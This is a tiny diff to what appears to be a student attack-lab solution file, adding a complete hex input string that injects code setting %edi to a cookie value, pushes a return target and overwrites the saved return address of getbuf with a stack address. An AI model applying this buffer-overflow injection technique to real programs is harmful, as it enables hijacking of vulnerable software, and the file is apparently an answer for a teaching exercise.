@@ -26,3 +26,5 @@ bf 9a d9 e2 68 # mov 0x68e2d99a, $edi
 c3 # retq
 
 48 81 67 55 00 00 00 00 # address <%rsp> in <getbuf> 0x55678148
+
+bf 9a d9 e2 68 68 4e 1d 42 00 c3 61 61 61 61 61 61 61 61 61 61 61 61 61 48 81 67 55 00 00 00 00 # input
